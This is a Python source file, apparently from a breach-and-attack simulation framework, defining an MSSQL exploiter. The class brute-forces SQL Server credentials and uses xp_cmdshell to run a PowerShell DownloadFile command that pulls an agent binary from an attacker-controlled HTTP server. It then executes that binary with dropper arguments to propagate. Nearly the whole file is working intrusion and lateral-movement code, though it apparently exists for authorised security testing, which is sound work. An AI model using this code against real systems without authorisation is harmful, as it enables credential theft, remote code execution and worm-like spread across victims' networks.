import logging
from pathlib import PureWindowsPath
from time import sleep, time
from typing import Iterable, Optional, Tuple

import pymssql

from common.common_consts import AGENT_OTP_ENVIRONMENT_VARIABLE
from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.credentials import get_plaintext
from common.tags import (
    T1059_ATTACK_TECHNIQUE_TAG,
    T1105_ATTACK_TECHNIQUE_TAG,
    T1110_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from common.utils.exceptions import FailedExploitationError
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import DROPPER_ARG
from infection_monkey.transport import LockedHTTPServer
from infection_monkey.utils.brute_force import generate_identity_secret_pairs
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)

MSSQL_EXPLOITER_TAG = "mssql-exploiter"


class MSSQLExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "MSSQL"
    LOGIN_TIMEOUT = LONG_REQUEST_TIMEOUT
    QUERY_TIMEOUT = LONG_REQUEST_TIMEOUT
    # Time in seconds to wait between MSSQL queries.
    QUERY_BUFFER = 0.5
    SQL_DEFAULT_TCP_PORT = "1433"

    # Single quotes are escaped in SQL by using two of them.
    # Example: 'It ain''t over ''til it''s over'
    AGENT_DOWNLOAD_COMMAND = (
        "powershell (new-object System.Net.WebClient)."
        "DownloadFile(^''{http_path}^'' , ^''{dst_path}^'')"
    )

    _EXPLOITER_TAGS = (MSSQL_EXPLOITER_TAG, T1110_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)
    _PROPAGATION_TAGS = (
        MSSQL_EXPLOITER_TAG,
        T1059_ATTACK_TECHNIQUE_TAG,
        T1105_ATTACK_TECHNIQUE_TAG,
    )

    def __init__(self):
        super().__init__()
        self.cursor = None
        self.agent_http_path = None

    def _exploit_host(self) -> ExploiterResultData:
        agent_path_on_victim = PureWindowsPath(get_agent_dst_path(self.host))

        # Brute force to get connection
        creds = generate_identity_secret_pairs(
            self.options["credentials"]["exploit_user_list"],
            self.options["credentials"]["exploit_password_list"],
        )
        try:
            self.cursor = self._brute_force(str(self.host.ip), self.SQL_DEFAULT_TCP_PORT, creds)
        except FailedExploitationError:
            error_message = (
                f"Failed brute-forcing of MSSQL server on {self.host},"
                f" no credentials were successful"
            )
            logger.error(error_message)
            return self.exploit_result

        if self._is_interrupted():
            return self.exploit_result

        timestamp = time()
        try:
            self._upload_agent(agent_path_on_victim)
            self._run_agent(agent_path_on_victim)
        except Exception as e:
            error_message = (
                f"An unexpected error occurred when trying "
                f"to exploit MSSQL on host {self.host}: {e}"
            )

            logger.error(error_message)
            self._publish_propagation_event(timestamp, False, error_message=error_message)
            self.exploit_result.error_message = error_message

            return self.exploit_result

        self._publish_propagation_event(timestamp, True)
        self.exploit_result.propagation_success = True
        return self.exploit_result

    def _brute_force(
        self, host: str, port: str, users_passwords_pairs_list: Iterable[Tuple[str, str]]
    ) -> pymssql.Cursor:
        """
        Starts the brute force connection attempts and if needed then init the payload process.
        Main loop starts here.

        Args:
            host (str): Host ip address
            port (str): Tcp port that the host listens to
            users_passwords_pairs_list (list): a list of users and passwords pairs to bruteforce
            with

        Return:
            True or False depends if the whole bruteforce and attack process was completed
            successfully or not
        """
        # Main loop
        # Iterates on users list
        credentials_iterator = interruptible_iter(
            users_passwords_pairs_list,
            self.interrupt,
            "MSSQL exploiter has been interrupted",
            logging.INFO,
        )

        for user, password in credentials_iterator:
            timestamp = time()
            try:
                # Core steps
                # Trying to connect
                conn = pymssql.connect(
                    host,
                    user,
                    get_plaintext(password),
                    port=port,
                    login_timeout=self.LOGIN_TIMEOUT,
                    timeout=self.QUERY_TIMEOUT,
                )
                logger.info(
                    f"Successfully connected to host: {host} using user: {user} and password"
                )
                self.exploit_result.exploitation_success = True
                self.add_vuln_port(MSSQLExploiter.SQL_DEFAULT_TCP_PORT)
                self._report_login_attempt(timestamp, True, user, password)
                cursor = conn.cursor()

                return cursor
            except pymssql.OperationalError as err:
                error_message = f"Connection to MSSQL failed: {err}"
                logger.info(error_message)
                self._report_login_attempt(timestamp, False, user, password, error_message)

        logger.warning(
            "No user/password combo was able to connect to host: {0}:{1}, "
            "aborting brute force".format(host, port)
        )
        raise FailedExploitationError("Bruteforce process failed on host: {0}".format(self.host.ip))

    def _report_login_attempt(
        self, timestamp: float, success: bool, user, password: str, message: str = ""
    ):
        self._publish_exploitation_event(timestamp, success, error_message=message)
        self.report_login_attempt(success, user, password)

    def _upload_agent(self, agent_path_on_victim: PureWindowsPath):
        http_thread = self._start_agent_server()

        self._run_agent_download_command(agent_path_on_victim)

        if http_thread:
            MSSQLExploiter._stop_agent_server(http_thread)

    def _start_agent_server(self) -> Optional[LockedHTTPServer]:
        self.agent_http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host,
            self.agent_binary_repository,
            self.tcp_port_selector,
        )
        return http_thread

    def _run_agent_download_command(self, agent_path_on_victim: PureWindowsPath):
        agent_download_command = MSSQLExploiter.AGENT_DOWNLOAD_COMMAND.format(
            http_path=self.agent_http_path, dst_path=str(agent_path_on_victim)
        )
        self._run_mssql_command(agent_download_command)

    def _run_mssql_command(self, command: str):
        sql_server_command = f"xp_cmdshell '{command}'"

        logger.debug(f"Running command on SQL Server: {sql_server_command}")

        self.cursor.execute(sql_server_command)
        self.add_executed_cmd(command)

        sleep(MSSQLExploiter.QUERY_BUFFER)

    @staticmethod
    def _stop_agent_server(http_thread: LockedHTTPServer):
        http_thread.stop()
        http_thread.join(LONG_REQUEST_TIMEOUT)

    def _run_agent(self, agent_path_on_victim: PureWindowsPath):
        agent_launch_command = self._build_agent_launch_command(agent_path_on_victim)
        self._run_mssql_command(agent_launch_command)

    def _build_agent_launch_command(self, agent_path_on_victim: PureWindowsPath) -> str:
        set_agent_otp_command = (
            f"set {AGENT_OTP_ENVIRONMENT_VARIABLE}={self.otp_provider.get_otp()}"
        )
        agent_args = build_monkey_commandline(
            self.agent_id, self.servers, self.current_depth + 1, str(agent_path_on_victim)
        )

        return f"{set_agent_otp_command} && {agent_path_on_victim} {DROPPER_ARG} {agent_args}"
